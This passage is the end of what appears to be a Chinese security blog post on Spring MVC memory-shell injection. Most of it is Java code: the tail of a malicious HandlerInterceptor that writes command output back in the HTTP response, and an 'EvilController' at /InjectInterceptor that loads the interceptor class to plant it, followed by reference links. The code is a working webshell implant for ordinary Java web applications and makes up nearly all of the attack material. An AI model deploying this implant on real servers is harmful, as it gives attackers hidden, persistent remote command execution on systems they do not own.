                <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">"\\A"</span><span class="o">);</span>
                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">""</span><span class="o">;</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">flush</span><span class="o">();</span>
                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">close</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="o">}</span>
            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">postHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">ModelAndView</span> <span class="n">modelAndView</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">HandlerInterceptor</span><span class="o">.</span><span class="na">super</span><span class="o">.</span><span class="na">postHandle</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="n">handler</span><span class="o">,</span> <span class="n">modelAndView</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">afterCompletion</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">Exception</span> <span class="n">ex</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">HandlerInterceptor</span><span class="o">.</span><span class="na">super</span><span class="o">.</span><span class="na">afterCompletion</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="n">handler</span><span class="o">,</span> <span class="n">ex</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>新建一个controller触发拦截器，作为入口</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.springmvc</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.springframework.stereotype.Controller</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.GetMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>

<span class="nd">@Controller</span>
<span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/InjectInterceptor"</span><span class="o">)</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">EvilController</span> <span class="o">{</span>
    <span class="nd">@GetMapping</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">index</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.example.springmvc.InjectInterceptor"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="s">"Inject done!"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172241-537d027e-957f-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230116172245-55d8c1ac-957f-1.png"/></p>
<p>参考：<a href="https://ho1aas.blog.csdn.net/article/details/123943546" target="_blank">https://ho1aas.blog.csdn.net/article/details/123943546</a></p>
<p><a href="https://www.freebuf.com/articles/web/327633.html" target="_blank">https://www.freebuf.com/articles/web/327633.html</a></p>
<p><a href="https://landgrey.me/blog/12/" target="_blank">https://landgrey.me/blog/12/</a></p>
</div>
</div>